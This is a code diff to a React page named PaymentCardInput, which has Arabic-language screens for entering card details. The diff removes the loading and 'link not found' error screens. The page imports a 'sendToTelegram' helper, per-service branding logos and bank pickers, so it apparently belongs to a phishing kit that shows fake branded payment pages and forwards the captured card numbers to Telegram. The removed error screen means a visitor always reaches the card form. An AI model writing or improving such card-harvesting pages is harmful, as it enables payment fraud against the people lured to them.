@@ -7,7 +7,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
-import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2, Loader2 } from "lucide-react";
+import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
@@ -18,7 +18,7 @@ const PaymentCardInput = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData, isLoading, error } = useLink(id);
+  const { data: linkData } = useLink(id);
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -42,32 +42,6 @@ const PaymentCardInput = () => {
   
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
-  
-  // Show loading state
-  if (isLoading) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center">
-          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-primary" />
-          <p className="text-muted-foreground">جاري التحميل...</p>
-        </div>
-      </div>
-    );
-  }
-  
-  // Show error state only after loading is complete
-  if (!isLoading && (error || !linkData)) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center p-8">
-          <AlertCircle className="w-16 h-16 mx-auto mb-4 text-destructive" />
-          <h2 className="text-2xl font-bold mb-2 text-foreground">الرابط غير موجود</h2>
-          <p className="text-muted-foreground mb-6">الرجاء التحقق من صحة الرابط</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
-        </div>
-      </div>
-    );
-  }
   
   const handleCardNumberChange = (value: string) => {
     const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
